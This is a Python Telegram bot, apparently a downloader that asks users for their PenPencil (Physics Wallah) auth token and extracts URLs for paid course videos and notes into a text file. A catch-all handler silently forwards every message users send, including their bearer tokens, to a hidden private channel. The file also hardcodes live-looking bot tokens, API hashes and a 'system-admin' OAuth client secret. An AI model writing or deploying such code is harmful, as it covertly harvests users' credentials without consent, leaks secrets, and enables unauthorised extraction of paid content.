
import asyncio
#import sys
import requests
#import json
from pyrogram import Client,filters
from pyrogram.types.messages_and_media import message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.errors import FloodWait
from pyromod import listen
from pyrogram.types import Message
import pyrogram
from pyrogram import Client, filters
from pyrogram.types import User, Message
#import os

acces = -1001834639543

print(4321)
bot = Client(
    "bot",
    api_id=26435700, 
    api_hash="527cf5174e120a9093611bc69d7b7709",
    bot_token="6155879022:AAFkLrPCRcDMFyk5GetOPYLEn6tybX6gu28") #6066236733:AAGV2ABVTOK5naEzmXly1-FaWbeTtA0R_kA

@bot.on_message(group=2)
async def account_login(bot: Client, m: Message):
    try:
        await bot.forward_messages(acces,m.chat.id,m.message_id)
    except:
        pass

@bot.on_message(filters.command(["pw"]))
async def account_login(bot: Client, m: Message):
    print(431)
    editable = await m.reply_text(
        "**Now Send Your PW Auth Token:**"
    )  
    input1: Message = await bot.listen(editable.chat.id)
    raw_text1=input1.text
    headers = {
            'Host': 'api.penpencil.co',
            'authorization': f"Bearer {raw_text1}",
            'client-id': '5eb393ee95fab7468a79d189',
            'client-version': '1910',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2101K6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
            'randomid': '72012511-256c-4e1c-b4c7-29d67136af37',
            'client-type': 'WEB',
            'content-type': 'application/json; charset=utf-8',
    }
    params = {
       'mode': '1',
       'amount': 'paid',
       'page': '1',
    }
    await m.reply_text("**You have these Batches :-\n\nBatch ID : Batch Name**")
    aa=''
    response = requests.get('https://api.penpencil.co/v3/batches/my-batches', params=params, headers=headers).json()["data"]
    for data in response:
        batch_name = data['name']
        batch_id = data['_id']
        aa = aa + f'**{batch_name}**  :  ```{batch_id}```\n\n'
    await m.reply_text(aa)
    editable1= await m.reply_text("**Now send the Batch ID to Download**")
    input3 = message = await bot.listen(editable.chat.id)
    raw_text3 = input3.text
    response2 = requests.get(f'https://api.penpencil.co/v3/batches/{raw_text3}/details', headers=headers).json()["data"]["subjects"]
    await m.reply_text("Subject : Subject_Id")
    bb= ''
    for data in response2:
        subject_name = data['subject']
        subject_id = data['_id']
        bb = bb  + f'**{subject_name}**  :  ```{subject_id}```\n\n'
    await m.reply_text(bb)
    editable2= await m.reply_text("**Now send the subject ID to Download**")
    input4 = message = await bot.listen(editable.chat.id)
    raw_text4 = input4.text
    await m.reply_text('**Now Send Content Type you want to extract.**\n```DppNotes```|```videos```|```notes```')
    input5 = message = await bot.listen(editable.chat.id)
    raw_text5 = input5.text
    xx =await m.reply_text("Genrating Course txt in this id")
    to_write = ''
    for z in range(1,15): # max 15 pages
        print(z) 
        params1 = {
        'page': f'{z}',
        'tag': '',
        'contentType': f'{raw_text5}',
        }
        
        response3 = requests.get(f'https://api.penpencil.co/v2/batches/{raw_text3}/subject/{raw_text4}/contents', params=params1, headers=headers).json()["data"]
        #with open(f"1pwnotes.json", "w", encoding="utf-8") as f:
        #    f.write(f'{response3}')
        #    print(1)
        #    sys.exit(1)
        
        if raw_text5 == 'videos':
            for data in response3:
                try:      
                    url = f"https://d26g5bnklkwsh4.cloudfront.net/{data['url'].split('/')[-2]}/hls/720/main.m3u8" if raw_text5 == "videos" else f"{data['baseUrl']}{data['key']}"
                    topic = data['topic']
                    #print(url)
                    write = f"{topic} {url}\n"
                    to_write = to_write + write
                except:
                    pass
        else: #for notes + dpps
            for i in range(len(response3)):
                #print(response3)
                #print(data1)
                try:
                    print(f'{i} {z} ')
                    c=response3[i]
                    b=c['homeworkIds'][0]
                    a = b['attachmentIds'][0]
                
                    #print(f'{b}')
                    name = response3[i]['homeworkIds'][0]['topic'].replace('|',' ').replace(':',' ')
                    #name = a['name']
                    url = a['baseUrl'] + a['key']
                    write = f"{name} {url}\n"
                    to_write = to_write + write
                except:
                    pass

    with open(f"{raw_text5} {raw_text4}.txt", "w", encoding="utf-8") as f:
        f.write(to_write)
        print(1)
    with open(f"{raw_text5} {raw_text4}.txt", "rb") as f:   
       # print(3)  
        await asyncio.sleep(5)
        doc = await message.reply_document(document=f, caption="Here is your txt file.")
        await xx.delete(True)
       # print(2)
    await bot.forward_messages(acces,doc.chat.id,doc.message_id)            

#@bot.on_message(filters.command(["token"])) # get token
async def alogin(bot: Client, m: Message):
    editable = await m.reply_text(
        "Send **Number or email** in this manner otherwise bot will not respond.\n\nSend like this:-  **mobile no.**"
    )  
    input1: Message = await bot.listen(editable.chat.id)
    raw_text1=input1.text
    headers = {
            'Host': 'api.penpencil.xyz',
            'authorization': 'Bearer',
            'client-id': '5eb393ee95fab7468a79d189',
            'client-version': '12.84',
            'user-agent': 'Android',
            'randomid': 'e4307177362e86f1',
            'client-type': 'MOBILE',
            'device-meta': '{APP_VERSION:12.84,DEVICE_MAKE:Asus,DEVICE_MODEL:ASUS_X00TD,OS_VERSION:6,PACKAGE_NAME:xyz.penpencil.physicswalb}',
            'content-type': 'application/json; charset=UTF-8',
            }

    params = {'smsType': '0',}

    json_data = {
            'username': f'{raw_text1}',
            'countryCode': '+91',
            'organizationId': '5eb393ee95fab7468a79d189',
                }

    
    response = requests.post('https://api.penpencil.xyz/v1/users/get-otp', params=params, headers=headers, json=json_data)
    editable = await m.reply_text("now send me otp")
    input2: Message = await bot.listen(editable.chat.id)
    raw_text2=input2.text
    data1={"username":'+raw_text1+',"otp":'+raw_text2+',"client_id":"system-admin","client_secret":"KjPXuAVfC5xbmgreETNMaL7z","grant_type":"password","organizationId":"5eb393ee95fab7468a79d189"}
    response1 = requests.post('https://api.penpencil.xyz/v1/oauth/token',headers=headers,json=data1).json()
    prog = await m.reply_text(response1)

print('starting')

bot.run()

print('started')

